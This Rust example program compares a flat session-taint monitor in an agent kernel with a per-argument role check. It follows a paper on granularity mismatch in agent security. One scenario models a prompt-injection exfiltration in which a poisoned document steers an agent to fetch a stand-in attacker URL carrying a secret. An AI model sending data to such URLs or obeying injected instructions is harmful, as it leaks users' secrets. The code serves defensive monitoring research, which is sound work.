//! PACT granularity-mismatch witness — a benign mixed-trust call the taint floor
//! blocks but an argument-level contract would allow.
//!
//! Run:
//!
//! ```text
//! cargo run -p world-kernel --example pact_witness --offline
//! ```
//!
//! Discovery artifact for `_tasks/1_discovery/pact-granularity-mismatch.md`
//! (arXiv:2605.11039, "The Granularity Mismatch in Agent Security").
//!
//! # What this shows
//!
//! PACT's Theorem 3 says: any *flat tool-level monitor* — one taint label per
//! call, block iff the action is externally effectful and the value is tainted —
//! must incur a false positive or a false negative in a mixed-trust environment.
//! Its Definition 1 of that monitor is, almost verbatim, our acceptance
//! invariant 7: [`world_kernel::invariants::check_taint`] blocks on a single
//! `Taint` scalar carried by [`harness_types::TaintContext`], which
//! [`harness_types::TaintContext::from_outputs`] computes as the *join of every*
//! upstream output. Any tainted value anywhere in the session taints the whole
//! next intent.
//!
//! The witness below drives the **real kernel** (`decide`) on three `fetch_web`
//! calls, then runs a minimal **L2 argument-role check** on the per-argument
//! provenance the flat monitor throws away. Two scenarios agree; the third is the
//! Theorem-3 false positive — and it is exactly session-2/step-3 of the flagship
//! `poisoned_knowledge_demo`, where a `fetch_web` to a *clean constant URL* is
//! blocked purely because the ambient session is tainted.
//!
//! # The honest caveat
//!
//! The flat monitor's block is *sound* (no false negatives) — it over-approximates
//! because it cannot prove the URL is clean-origin. The L2 check needs real
//! **per-argument** provenance, which the current `TaintContext` scalar and the
//! opaque `ToolCall.arguments` blob do not carry. Recovering it is the upgrade;
//! roles come from the manifest at design time (no LLM on the gate), so it stays
//! on the right side of the stochastic–deterministic border (`docs/THESIS.md` §3).

use compiler::compile_default;
use harness_types::{
    ActionName, CallId, ExecutionMode, Provenance, Provider, SideEffectClass, SourceChannel, Taint,
    TaintContext, ToolCall,
};
use serde_json::json;
use world_kernel::taint::externally_effectful;
use world_kernel::{decide, BudgetUsage, EvalContext, KernelOutcome};

const GUIDE_URL: &str = "https://docs.example/guide";

// ── PACT's six argument roles (§3.2). Only the *policy interface* matters here:
//    which arguments bind authority vs. which merely carry content. The full set
//    is listed for fidelity; this witness only exercises `Target`. ──
#[derive(Clone, Copy, PartialEq)]
#[allow(dead_code)]
enum Role {
    /// Authority-bearing destination: recipient, URL, endpoint.
    Target,
    /// Executable command or query.
    Command,
    /// A secret.
    Credential,
    /// Payload text — carries content, does not bind authority.
    Content,
    /// Object selection.
    Selector,
    /// Behaviour-modifying flag.
    Control,
}

impl Role {
    /// PACT's split: `target`/`command`/`credential` bind authority; the rest
    /// primarily carry content. A tainted authority-bearing argument is the real
    /// hazard; tainted content flowing to a clean destination is benign.
    fn is_authority_bearing(self) -> bool {
        matches!(self, Role::Target | Role::Command | Role::Credential)
    }
}

struct Arg {
    name: &'static str,
    role: Role,
    /// Provenance of *this argument's value* — the thing the flat monitor discards.
    taint: Taint,
}

/// The L2 check: block iff the action is externally effectful **and some
/// authority-bearing argument is tainted**. Linear in the arguments; only lattice
/// comparisons — deterministic, no LLM (PACT Algorithm 1, restricted to L2).
fn l2_blocks(args: &[Arg], side_effect: SideEffectClass) -> Option<&'static str> {
    if !externally_effectful(side_effect) {
        return None;
    }
    args.iter()
        .find(|a| a.role.is_authority_bearing() && a.taint.is_tainted())
        .map(|a| a.name)
}

struct Scenario {
    title: &'static str,
    /// The URL the model actually proposes (its data-flow origin matters).
    url: &'static str,
    /// Ambient session taint reaching the kernel via `TaintContext` — the join of
    /// all prior outputs. Tainted once any untrusted doc has been retrieved.
    ambient: Taint,
    /// Per-argument provenance for the L2 check. For `fetch_web`, `url` is the
    /// sole argument and its role is `Target` (authority-bearing).
    url_taint: Taint,
}

fn main() {
    let world = compile_default();
    let side_effect = world
        .side_effect(&ActionName::new("fetch_web"))
        .unwrap_or(SideEffectClass::Network);

    println!();
    println!("  ai2rules — PACT granularity-mismatch witness");
    println!("  flat monitor (real kernel: check_taint over TaintContext scalar)");
    println!("  vs. L2 argument-role contract (per-argument provenance)\n");
    println!("    {:<34} {:<10} {:<12} note", "scenario", "flat", "L2");
    println!("    {}", "-".repeat(78));

    let scenarios = [
        Scenario {
            // poisoned_knowledge_demo, session 1.
            title: "1. legit fetch, clean session",
            url: GUIDE_URL,
            ambient: Taint::Clean,
            url_taint: Taint::Clean,
        },
        Scenario {
            // poisoned_knowledge_demo, session 2 / step 2: the exfil. The URL is
            // derived from the injected instruction in the tainted document.
            title: "2. exfil: URL derived from poison",
            url: "http://attacker.evil/collect?k=SECRET",
            ambient: Taint::Tainted,
            url_taint: Taint::Tainted,
        },
        Scenario {
            // poisoned_knowledge_demo, session 2 / step 3: the *identical* legit
            // fetch from session 1. Its URL is a clean constant — not derived from
            // the poison — but the ambient session is tainted.
            title: "3. legit fetch, tainted session",
            url: GUIDE_URL,
            ambient: Taint::Tainted,
            url_taint: Taint::Clean,
        },
    ];

    let mut witness_found = false;

    for s in &scenarios {
        // ── Flat monitor: the real kernel. TaintContext carries one scalar. ──
        let call = ToolCall {
            action_name: ActionName::new("fetch_web"),
            arguments: json!({ "url": s.url }),
            provider: Provider::CliNative,
            call_id: CallId::new("witness"),
            source_perceptions: vec![],
            session_id: harness_types::SessionId::new("witness"),
        };
        let provenance = Provenance::from_channel(
            SourceChannel::UserPrompt,
            harness_types::SessionId::new("witness"),
            harness_types::ContentHash::new("witness"),
        );
        let ctx = EvalContext {
            taint: TaintContext::from_taint(s.ambient),
            mode: ExecutionMode::Interactive,
            usage: BudgetUsage::default(),
            approval_granted: false,
        };
        let flat_blocks = matches!(
            decide(&world, &call, provenance, &ctx),
            KernelOutcome::NotRepresentable { .. }
        );

        // ── L2: the per-argument check on provenance the flat monitor discarded. ──
        let args = [Arg {
            name: "url",
            role: Role::Target,
            taint: s.url_taint,
        }];
        let l2_block = l2_blocks(&args, side_effect);

        let note = match (flat_blocks, l2_block.is_some()) {
            (true, true) => "both block — agree (no false negative)",
            (false, false) => "both allow — agree",
            (true, false) => {
                witness_found = true;
                "◀ FLAT BLOCKS, L2 ALLOWS — Theorem-3 witness"
            }
            (false, true) => "L2 stricter than flat (unexpected)",
        };

        println!(
            "    {:<34} {:<10} {:<12} {}",
            s.title,
            if flat_blocks { "DENY" } else { "ALLOW" },
            if l2_block.is_some() { "BLOCK" } else { "ALLOW" },
            note,
        );
    }

    println!();
    println!("  Scenario 3 is a false positive: the authority-bearing argument (url) is a");
    println!("  clean constant, yet the flat monitor blocks it because the *ambient* session");
    println!("  taint — the TaintContext join — is Tainted. The L2 contract checks the url");
    println!("  argument's own provenance and allows it, while scenario 2 (url actually");
    println!("  derived from the poison) still blocks under both. That is Theorem 3:");
    println!("  the flat monitor cannot separate scenario 2 from scenario 3; L2 can.");
    println!();
    assert!(
        witness_found,
        "expected a Theorem-3 witness (flat blocks, L2 allows)"
    );
    println!("  witness confirmed ✓");
}
